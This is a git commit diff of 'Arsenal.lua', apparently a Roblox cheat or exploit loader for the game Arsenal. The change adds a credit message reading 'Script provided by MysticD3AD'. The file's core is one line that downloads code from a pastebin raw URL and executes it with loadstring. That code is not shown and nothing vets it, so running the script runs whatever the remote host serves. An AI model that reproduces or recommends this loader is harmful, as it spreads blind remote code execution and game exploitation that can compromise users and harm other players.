ebfe445b8e604b9964c47fa83866d60984cc1648
MysticD3AD <30682549+MysticD3AD@users.noreply.github.com>
2019-12-03 17:40:24 +1100

    Update Arsenal.lua

--- Arsenal.lua
+++ Arsenal.lua
@@ -1,1 +1,7 @@
+local h = Instance.new("Message")
+h.Parent = Workspace
+h.Text = "Script provided by MysticD3AD"
+wait(6)
+h:Remove()
+
 loadstring(game:HttpGet('https://pastebin.com/raw/T3fzg7tm', true))()
